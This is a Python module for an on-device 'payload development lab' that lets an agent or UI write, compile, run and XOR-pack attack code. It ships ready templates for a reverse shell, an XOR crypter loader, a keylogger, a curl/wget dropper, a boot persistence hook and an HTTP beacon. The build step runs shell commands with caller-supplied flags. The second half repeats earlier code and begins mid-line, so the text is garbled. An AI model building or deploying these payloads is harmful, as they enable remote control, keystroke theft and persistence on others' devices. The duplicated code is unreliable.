"""apex_lab — an on-device build environment for payload development.

Purpose: an operator working a red-team engagement should not have to leave the
app to write, compile and verify a payload. This gives the agent (and the UI) a
sandboxed directory tree plus a real toolchain driver:

    write    put source into the lab (any language, from a template or literal)
    build    compile/link it with the toolchain this host actually has
    run      execute it with a timeout and capture stdout/stderr
    inspect  file/objdump/readelf/strings/sha256 on the artifact
    pack     XOR / base64-encode a built artifact for transport testing
    list/read/delete

Everything lives under <workspace>/lab/<name>/ so nothing a build produces can
land in the app directory, and every path is resolved and checked against that
root before use.

Templates are working starting points for the common engagement payloads.
They are intentionally parameterised (LHOST/RPORT) rather than hard-coded, and
the C ones compile for this device's ABI.
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import re
import shutil
import subprocess
import time

ROOT = os.path.dirname(os.path.abspath(__file__))
WORKSPACE = os.environ.get("APEX_WORKSPACE") or os.path.join(ROOT, ".suroot", "apex_workspace")
LAB_DIR = os.path.join(WORKSPACE, "lab")
NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$")

COMPILERS = {
    "c": ("{cc} -O2 -o {out} {src}", ["gcc", "clang", "cc"]),
    "cpp": ("{cc} -O2 -std=c++17 -o {out} {src}", ["g++", "clang++"]),
    "asm": ("{cc} -nostdlib -static -o {out} {src}", ["gcc", "as"]),
    "sh": ("cp {src} {out} && chmod +x {out}", ["sh"]),
    "py": ("cp {src} {out} && chmod +x {out}", ["python3"]),
    "js": ("cp {src} {out} && chmod +x {out}", ["node"]),
}


# --------------------------------------------------------------------------
#  templates
# --------------------------------------------------------------------------
REVSHELL_C = r"""/* lab template: TCP reverse shell (Linux/Android ELF)
 * Build: gcc -O2 -o revshell revshell.c     Run: ./revshell <LHOST> <LPORT>
 * For authorised engagements only -- connects back to the host you name.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char **argv) {
    const char *host = argc > 1 ? argv[1] : "127.0.0.1";
    int port = argc > 2 ? atoi(argv[2]) : 4444;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((unsigned short)port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) != 1) {
        fprintf(stderr, "bad address %s\n", host); return 1;
    }
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { perror("connect"); return 1; }
    dup2(s, 0); dup2(s, 1); dup2(s, 2);
    execl("/bin/sh", "sh", "-i", (char *)NULL);
    return 0;
}
"""

XOR_C = r"""/* lab template: XOR crypter/loader stub
 * Encrypts nothing by itself -- pair it with `pack` in the lab UI, paste the
 * hex blob below, and it decrypts into an anonymous mmap and jumps in.
 * `pack` prints the exact C array to paste.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

static unsigned char blob[] = { 0x00 };
static const unsigned int blob_len = 0;
static const unsigned char key = 0x5a;

int main(void) {
    if (!blob_len) { fprintf(stderr, "empty blob: run `pack` first\n"); return 1; }
    void *m = mmap(NULL, blob_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED) { perror("mmap"); return 1; }
    for (unsigned int i = 0; i < blob_len; i++)
        ((unsigned char *)m)[i] = blob[i] ^ key;
    ((void (*)(void))m)();
    return 0;
}
"""

KEYLOG_C = r"""/* lab template: keystroke capture from a specific tty (Linux/Android root)
 * Run: ./keylog /dev/pts/N   -> appends to ./keylog.out
 * Reads one input device only; it is not a kernel module and does not hook
 * anything globally.
 */
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

int main(int argc, char **argv) {
    const char *dev = argc > 1 ? argv[1] : "/dev/input/event0";
    int fd = open(dev, O_RDONLY);
    if (fd < 0) { perror(dev); return 1; }
    FILE *out = fopen("keylog.out", "a");
    if (!out) { perror("keylog.out"); return 1; }
    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) == sizeof(ev)) {
        if (ev.type == EV_KEY && ev.value == 1)
            fprintf(out, "%u\n", ev.code), fflush(out);
    }
    fclose(out);
    return 0;
}
"""

DROPPER_SH = r"""#!/bin/sh
# lab template: staged dropper
# Each stage is verified before the next runs; nothing is fetched silently.
set -eu
STAGE_URL="${1:-}"
DEST="${2:-./stage2}"
[ -n "$STAGE_URL" ] || { echo "usage: $0 <url> [dest]"; exit 2; }
command -v curl >/dev/null 2>&1 && FETCH="curl -fsSL" || FETCH="wget -qO-"
$FETCH "$STAGE_URL" > "$DEST.part" || { echo "fetch failed"; exit 3; }
[ -s "$DEST.part" ] || { echo "empty payload"; rm -f "$DEST.part"; exit 4; }
mv "$DEST.part" "$DEST"
chmod +x "$DEST"
echo "staged $DEST ($(wc -c < "$DEST") bytes, sha256 $(sha256sum "$DEST" | cut -d' ' -f1))"
"""

PERSIST_SH = r"""#!/bin/sh
# lab template: persistence via user init hook (Termux-style), not systemd
set -eu
PAYLOAD="${1:-./payload}"
HOOK="$HOME/.termux/boot"
[ -f "$PAYLOAD" ] || { echo "missing payload: $PAYLOAD"; exit 2; }
mkdir -p "$HOOK"
cat > "$HOOK/90-lab.sh" <<EOF
#!/data/data/com.termux/files/usr/bin/sh
nohup "$(cd "$(dirname "$PAYLOAD")" && pwd)/$(basename "$PAYLOAD")" >/dev/null 2>&1 &
EOF
chmod +x "$HOOK/90-lab.sh"
echo "installed $HOOK/90-lab.sh"
"""

BEACON_PY = r"""#!/usr/bin/env python3
# lab template: minimal HTTP beacon (loopback by default)
import sys, time, urllib.request

url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/beacon"
interval = float(sys.argv[2]) if len(sys.argv) > 2 else 30.0
while True:
    try:
        with urllib.request.urlopen(url, timeout=8) as r:
            print("beacon", r.status, time.strftime("%H:%M:%S"), flush=True)
    except Exception as e:
        print("beacon failed:", type(e).__name__, flush=True)
    time.sleep(interval)
"""

TEMPLATES = {
    "revshell": ("c", "revshell.c", REVSHELL_C,
                 "TCP reverse shell, ELF for this ABI; takes host and port at runtime"),
    "crypter": ("c", "crypter.c", XOR_C,
                "XOR blob loader: paste the array produced by `pack`, jumps into mmap"),
    "keylog": ("c", "keylog.c", KEYLOG_C,
               "reads one input device and logs key codes to keylog.out"),
    "dropper": ("sh", "dropper.sh", DROPPER_SH,
                "two-stage downloader with size and hash verification"),
    "persist": ("sh", "persist.sh", PERSIST_SH,
                "installs a boot hook that relaunches a payload"),
    "beacon": ("py", "beacon.py", BEACON_PY,
               "periodic HTTP callback with failure handling"),
}


def _root():
    os.makedirs(LAB_DIR, exist_ok=True)
    return LAB_DIR


def _safe(name):
    name = str(name or "").strip()
    if not NAME_RE.match(name):
        raise ValueError(f"invalid lab name {name!r}: letters, digits, . _ - only")
    path = os.path.realpath(os.path.join(_root(), name))
    if not path.startswith(os.path.realpath(_root()) + os.sep):
        raise ValueError("path escapes the lab directory")
    return path


def _which(names):
    for n in names:
        p = shutil.which(n)
        if p:
            return p
    return None


def doctor():
    """What can actually be built here, right now."""
    cc = _which(["gcc", "clang", "cc"])
    tools = {n: shutil.which(n) for n in
             ("gcc", "clang", "cc", "g++", "node", "python3", "sh", "xxd",
              "base64", "objdump", "readelf", "strings", "file", "strip", "nasm")}
    return {"ok": True, "lab_dir": _root(), "cc": cc,
            "arch": os.uname().machine if hasattr(os, "uname") else None,
            "tools": tools,
            "can_build": [k for k, v in COMPILERS.items() if _which(v[1])],
            "templates": sorted(TEMPLATES),
            "free_mb": _free_mb()}


def _free_mb():
    try:
        st = os.statvfs(_root())
        return int(st.f_bavail * st.f_frsize / (1024 * 1024))
    except Exception:
        return None


def write(name, source=None, template=None, lang=None):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if not source and template:
        t = TEMPLATES.get(str(template).lower())
        if not t:
            return {"ok": False, "error": f"unknown template {template}",
                    "templates": sorted(TEMPLATES)}
        lang, fname, source = t[0], t[1], t[2]
    if not source:
        return {"ok": False, "error": "provide source or template"}
    lang = (lang or _lang_of(name) or _sniff(source) or "txt").lower()
    fname = _fname_for(name, lang)
    os.makedirs(d, exist_ok=True)
    src = os.path.join(d, fname)
    with open(src, "w") as f:
        f.write(source)
    return {"ok": True, "name": name, "lang": lang, "source_path": src,
            "bytes": len(source), "template": template}


EXT = {"c": ".c", "cpp": ".cpp", "asm": ".s", "sh": ".sh", "py": ".py", "js": ".js"}


def _sniff(source):
    """Guess the language from the source itself, so a pasted snippet with no
    extension still lands in a file the compiler path can pick up."""
    s = str(source or "")
    head = s[:4000]
    if not head.strip():
        return None
    if head.lstrip().startswith("#!"):
        first = head.lstrip().splitlines()[0].lower()
        if "python" in first:
            return "py"
        if "node" in first:
            return "js"
        return "sh"
    if "#include" in head or "int main" in head or "void main" in head:
        if "std::" in head or "#include <iostream>" in head or "using namespace std" in head:
            return "cpp"
        return "c"
    if ".global _start" in head or ".section .text" in head or "section .text" in head:
        return "asm"
    if ("def " in head and ":" in head) or "import " in head or "print(" in head:
        return "py"
    if "function " in head or "=>" in head or "const " in head or "require(" in head:
        return "js"
    if head.startswith("export ") or "$(dirname" in head or "if [ " in head:
        return "sh"
    return None


def _lang_of(name):
    for tag, ext in sorted(EXT.items(), key=lambda kv: -len(kv[1])):
        if str(name).endswith(ext):
            return tag
    return None


def _fname_for(name, lang):
    if _lang_of(name):
        return name
    return str(name) + EXT.get(lang, ".txt")


def build(name, lang=None, flags=None, src=None):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    files = [f for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))] if os.path.isdir(d) else []
    if src:
        source = os.path.join(d, src)
    else:
        # newest source wins, so a revised file rebuilds without renaming
        cands = [os.path.join(d, f) for f in files
                 if _lang_of(f) and f != name + ".bin"]
        if not cands:
            return {"ok": False, "error": "no source in lab entry", "files": files}
        source = max(cands, key=lambda p: os.path.getmtime(p))
    lang = (lang or _lang_of(source) or "txt").lower()
    if lang not in COMPILERS:
        return {"ok": False, "error": f"cannot build {lang}", "buildable": sorted(COMPILERS)}
    cmd_t, tools = COMPILERS[lang]
    cc = _which(tools)
    if not cc:
        return {"ok": False, "error": f"no compiler for {lang}", "looked_for": tools,
                "hint": "provision one, or write a script instead"}
    out = os.path.join(d, name + ".bin")
    cmd = cmd_t.format(cc=cc, src=source, out=out)
    if flags:
        cmd = cmd.replace("-O2", "-O2 " + " ".join(str(flags).split())[:300], 1)
    t0 = time.time()
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "compiler timed out after 180s", "cmd": cmd}
    ms = int((time.time() - t0) * 1000)
    if p.returncode != 0 or not os.path.exists(out):
        return {"ok": False, "error": "build failed", "cmd": cmd, "rc": p.returncode,
                "stderr": (p.stderr or p.stdout or "")[-3000:]}
    try:
        os.chmod(out, 0o755)
    except OSError:
        pass
    return {"ok": True, "artifact": out, "cmd": cmd, "ms": ms,
            "bytes": os.path.getsize(out), "sha256": _sha(out),
            "warnings": (p.stderr or "").strip()[-1200:]}


def _sha(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def artifact(name):
    d = _safe(name)
    out = os.path.join(d, name + ".bin")
    if os.path.exists(out):
        return out
    raise ValueError("no artifact yet: build first")


def run(name, args=None, timeout=10, env_extra=None):
    """Execute a built artifact with a hard timeout. Output is captured."""
    try:
        d = _safe(name)
        path = artifact(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    argv = [path] + ([str(a) for a in args] if isinstance(args, list)
                     else (str(args).split() if args else []))
    env = dict(os.environ)
    env.update(env_extra or {})
    t0 = time.time()
    try:
        p = subprocess.run(argv, cwd=d, capture_output=True, text=True,
                           timeout=max(1, min(int(timeout), 60)), env=env,
                           input="")
    except subprocess.TimeoutExpired as e:
        return {"ok": True, "timed_out": True, "ms": int((time.time() - t0) * 1000),
                "stdout": (e.stdout or b"").decode("utf-8", "replace")
                if isinstance(e.stdout, bytes) else (e.stdout or ""),
                "stderr": "killed after timeout",
                "note": "a timeout is normal for a listener or long-running implant"}
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}
    return {"ok": True, "timed_out": False, "rc": p.returncode,
            "ms": int((time.time() - t0) * 1000),
            "stdout": (p.stdout or "")[-4000:], "stderr": (p.stderr or "")[-2000:]}


def inspect(name):
    try:
        path = artifact(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    out = {"ok": True, "path": path, "bytes": os.path.getsize(path),
           "sha256": _sha(path)}
    for tool, args in (("file", [path]), ("readelf", ["-h", path]),
                       ("objdump", ["-f", path]), ("strings", ["-n", "6", path])):
        exe = shutil.which(tool)
        if not exe:
            continue
        try:
            p = subprocess.run([exe] + args, capture_output=True, text=True, timeout=30)
            out[tool] = (p.stdout or p.stderr or "")[:2500]
        except Exception:
            pass
    return out


def pack(name, key=0x5A):
    """XOR + base64 an artifact, and emit the C array the crypter template eats."""
    try:
        path = artifact(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    data = open(path, "rb").read()
    k = int(key) & 0xFF
    enc = bytes(b ^ k for b in data)
    arr = ",".join("0x%02x" % b for b in enc[:4096])
    return {"ok": True, "artifact": path, "key": k, "in_bytes": len(data),
            "b64": base64.b64encode(enc).decode(),
            "c_array": "{ " + arr + " }" if arr else "{}",
            "truncated_array": len(data) > 4096}


def list_lab():
    root = _root()
    out = []
    for n in sorted(os.listdir(root)):
        d = os.path.join(root, n)
        if not os.path.isdir(d):
            continue
        files = []
        for f in sorted(os.listdir(d)):
            p = os.path.join(d, f)
            if os.path.isfile(p):
                files.append({"name": f, "bytes": os.path.getsize(p),
                              "mtime": time.strftime("%m-%d %H:%M",
                                                     time.localtime(os.path.getmtime(p)))})
        art = os.path.join(d, n + ".bin")
        out.append({"name": n, "files": files,
                    "built": os.path.exists(art),
                    "artifact_bytes": os.path.getsize(art) if os.path.exists(art) else 0})
    return {"ok": True, "lab_dir": root, "entries": out}


def read(name, file=None, max_bytes=200000):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if file:
        p = os.path.realpath(os.path.join(d, file))
        if not p.startswith(d + os.sep):
            return {"ok": False, "error": "path escapes the lab entry"}
    else:
        cands = [os.path.join(d, f) for f in os.listdir(d) if _lang_of(f)]
        if not cands:
            return {"ok": False, "error": "no source file"}
        p = max(cands, key=os.path.getmtime)
    if not os.path.exists(p):
        return {"ok": False, "error": f"missing {p}"}
    with open(p, "rb") as f:
        data = f.read(max_bytes)
    return {"ok": True, "path": p, "text": data.decode("utf-8", "replace")}


def delete(name):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if not os.path.isdir(d):
        return {"ok": False, "error": "no such lab entry"}
    shutil.rmtree(d)
    return {"ok": True, "deleted": name}


def call(action, args=None):
    """Dispatcher used by the agent tool layer and the HTTP routes."""
    args = args if isinstance(args, dict) else {}
    action = (args.get("action") or action or "list").lower()
    try:
        if action in ("doctor", "env", "status"):
            return doctor()
        if action in ("write", "create", "new"):
            return write(args.get("name") or args.get("title"),
                         source=args.get("source") or args.get("code"),
                         template=args.get("template"), lang=args.get("lang"))
        if action in ("build", "compile", "make"):
            return build(args.get("name"), args.get("lang"), args.get("flags"),
                         args.get("src"))
        if action in ("run", "exec", "test"):
            return run(args.get("name"), args.get("args"),
                       args.get("timeout") or 10)
        if action in ("inspect", "analyze", "info"):
            return inspect(args.get("name"))
        if action in ("pack", "encode", "crypt"):
            return pack(args.get("name"), args.get("key") or 0x5A)
        if action in ("list", "ls"):
            return list_lab()
        if action in ("read", "cat", "show"):
            return read(args.get("name"), args.get("file"))
        if action in ("delete", "rm"):
            return delete(args.get("name"))
        if action in ("templates", "tpl"):
            return {"ok": True, "templates": [
                {"name": k, "lang": v[0], "file": v[1], "why": v[3]}
                for k, v in sorted(TEMPLATES.items())]}
        return {"ok": False, "error": f"unknown lab action {action}",
                "valid": ["doctor", "write", "build", "run", "inspect", "pack",
                          "list", "read", "delete", "templates"]}
    except Exception as e:
        return {"ok": False, "error": f"lab {action} failed: {type(e).__name__}: {e}"}


if __name__ == "__main__":
    print(json.dumps(doctor(), indent=2))
d or "#include <iostream>" in head or "using namespace std" in head:
            return "cpp"
        return "c"
    if ".global _start" in head or ".section .text" in head or "section .text" in head:
        return "asm"
    if ("def " in head and ":" in head) or "import " in head or "print(" in head:
        return "py"
    if "function " in head or "=>" in head or "const " in head or "require(" in head:
        return "js"
    if head.startswith("export ") or "$(dirname" in head or "if [ " in head:
        return "sh"
    return None


def _lang_of(name):
    for tag, ext in sorted(EXT.items(), key=lambda kv: -len(kv[1])):
        if str(name).endswith(ext):
            return tag
    return None


def _fname_for(name, lang):
    if _lang_of(name):
        return name
    return str(name) + EXT.get(lang, ".txt")


def build(name, lang=None, flags=None, src=None):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    files = [f for f in os.listdir(d) if os.path.isfile(os.path.join(d, f))] if os.path.isdir(d) else []
    if src:
        source = os.path.join(d, src)
    else:
        # newest source wins, so a revised file rebuilds without renaming
        cands = [os.path.join(d, f) for f in files
                 if _lang_of(f) and f != name + ".bin"]
        if not cands:
            return {"ok": False, "error": "no source in lab entry", "files": files}
        source = max(cands, key=lambda p: os.path.getmtime(p))
    lang = (lang or _lang_of(source) or "txt").lower()
    if lang not in COMPILERS:
        return {"ok": False, "error": f"cannot build {lang}", "buildable": sorted(COMPILERS)}
    cmd_t, tools = COMPILERS[lang]
    cc = _which(tools)
    if not cc:
        return {"ok": False, "error": f"no compiler for {lang}", "looked_for": tools,
                "hint": "provision one, or write a script instead"}
    out = os.path.join(d, name + ".bin")
    cmd = cmd_t.format(cc=cc, src=source, out=out)
    if flags:
        cmd = cmd.replace("-O2", "-O2 " + " ".join(str(flags).split())[:300], 1)
    t0 = time.time()
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "compiler timed out after 180s", "cmd": cmd}
    ms = int((time.time() - t0) * 1000)
    if p.returncode != 0 or not os.path.exists(out):
        return {"ok": False, "error": "build failed", "cmd": cmd, "rc": p.returncode,
                "stderr": (p.stderr or p.stdout or "")[-3000:]}
    try:
        os.chmod(out, 0o755)
    except OSError:
        pass
    return {"ok": True, "artifact": out, "cmd": cmd, "ms": ms,
            "bytes": os.path.getsize(out), "sha256": _sha(out),
            "warnings": (p.stderr or "").strip()[-1200:]}


def _sha(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def artifact(name):
    d = _safe(name)
    out = os.path.join(d, name + ".bin")
    if os.path.exists(out):
        return out
    raise ValueError("no artifact yet: build first")


def run(name, args=None, timeout=10, env_extra=None):
    """Execute a built artifact with a hard timeout. Output is captured."""
    try:
        d = _safe(name)
        path = artifact(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    argv = [path] + ([str(a) for a in args] if isinstance(args, list)
                     else (str(args).split() if args else []))
    env = dict(os.environ)
    env.update(env_extra or {})
    t0 = time.time()
    try:
        p = subprocess.run(argv, cwd=d, capture_output=True, text=True,
                           timeout=max(1, min(int(timeout), 60)), env=env,
                           input="")
    except subprocess.TimeoutExpired as e:
        return {"ok": True, "timed_out": True, "ms": int((time.time() - t0) * 1000),
                "stdout": (e.stdout or b"").decode("utf-8", "replace")
                if isinstance(e.stdout, bytes) else (e.stdout or ""),
                "stderr": "killed after timeout",
                "note": "a timeout is normal for a listener or long-running implant"}
    except Exception as e:
        return {"ok": False, "error": f"{type(e).__name__}: {e}"}
    return {"ok": True, "timed_out": False, "rc": p.returncode,
            "ms": int((time.time() - t0) * 1000),
            "stdout": (p.stdout or "")[-4000:], "stderr": (p.stderr or "")[-2000:]}


def inspect(name):
    try:
        path = artifact(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    out = {"ok": True, "path": path, "bytes": os.path.getsize(path),
           "sha256": _sha(path)}
    for tool, args in (("file", [path]), ("readelf", ["-h", path]),
                       ("objdump", ["-f", path]), ("strings", ["-n", "6", path])):
        exe = shutil.which(tool)
        if not exe:
            continue
        try:
            p = subprocess.run([exe] + args, capture_output=True, text=True, timeout=30)
            out[tool] = (p.stdout or p.stderr or "")[:2500]
        except Exception:
            pass
    return out


def pack(name, key=0x5A):
    """XOR + base64 an artifact, and emit the C array the crypter template eats."""
    try:
        path = artifact(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    data = open(path, "rb").read()
    k = int(key) & 0xFF
    enc = bytes(b ^ k for b in data)
    arr = ",".join("0x%02x" % b for b in enc[:4096])
    return {"ok": True, "artifact": path, "key": k, "in_bytes": len(data),
            "b64": base64.b64encode(enc).decode(),
            "c_array": "{ " + arr + " }" if arr else "{}",
            "truncated_array": len(data) > 4096}


def list_lab():
    root = _root()
    out = []
    for n in sorted(os.listdir(root)):
        d = os.path.join(root, n)
        if not os.path.isdir(d):
            continue
        files = []
        for f in sorted(os.listdir(d)):
            p = os.path.join(d, f)
            if os.path.isfile(p):
                files.append({"name": f, "bytes": os.path.getsize(p),
                              "mtime": time.strftime("%m-%d %H:%M",
                                                     time.localtime(os.path.getmtime(p)))})
        art = os.path.join(d, n + ".bin")
        out.append({"name": n, "files": files,
                    "built": os.path.exists(art),
                    "artifact_bytes": os.path.getsize(art) if os.path.exists(art) else 0})
    return {"ok": True, "lab_dir": root, "entries": out}


def read(name, file=None, max_bytes=200000):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if file:
        p = os.path.realpath(os.path.join(d, file))
        if not p.startswith(d + os.sep):
            return {"ok": False, "error": "path escapes the lab entry"}
    else:
        cands = [os.path.join(d, f) for f in os.listdir(d) if _lang_of(f)]
        if not cands:
            return {"ok": False, "error": "no source file"}
        p = max(cands, key=os.path.getmtime)
    if not os.path.exists(p):
        return {"ok": False, "error": f"missing {p}"}
    with open(p, "rb") as f:
        data = f.read(max_bytes)
    return {"ok": True, "path": p, "text": data.decode("utf-8", "replace")}


def delete(name):
    try:
        d = _safe(name)
    except ValueError as e:
        return {"ok": False, "error": str(e)}
    if not os.path.isdir(d):
        return {"ok": False, "error": "no such lab entry"}
    shutil.rmtree(d)
    return {"ok": True, "deleted": name}


def call(action, args=None):
    """Dispatcher used by the agent tool layer and the HTTP routes."""
    args = args if isinstance(args, dict) else {}
    action = (args.get("action") or action or "list").lower()
    try:
        if action in ("doctor", "env", "status"):
            return doctor()
        if action in ("write", "create", "new"):
            return write(args.get("name") or args.get("title"),
                         source=args.get("source") or args.get("code"),
                         template=args.get("template"), lang=args.get("lang"))
        if action in ("build", "compile", "make"):
            return build(args.get("name"), args.get("lang"), args.get("flags"),
                         args.get("src"))
        if action in ("run", "exec", "test"):
            return run(args.get("name"), args.get("args"),
                       args.get("timeout") or 10)
        if action in ("inspect", "analyze", "info"):
            return inspect(args.get("name"))
        if action in ("pack", "encode", "crypt"):
            return pack(args.get("name"), args.get("key") or 0x5A)
        if action in ("list", "ls"):
            return list_lab()
        if action in ("read", "cat", "show"):
            return read(args.get("name"), args.get("file"))
        if action in ("delete", "rm"):
            return delete(args.get("name"))
        if action in ("templates", "tpl"):
            return {"ok": True, "templates": [
                {"name": k, "lang": v[0], "file": v[1], "why": v[3]}
                for k, v in sorted(TEMPLATES.items())]}
        return {"ok": False, "error": f"unknown lab action {action}",
                "valid": ["doctor", "write", "build", "run", "inspect", "pack",
                          "list", "read", "delete", "templates"]}
    except Exception as e:
        return {"ok": False, "error": f"lab {action} failed: {type(e).__name__}: {e}"}


if __name__ == "__main__":
    print(json.dumps(doctor(), indent=2))
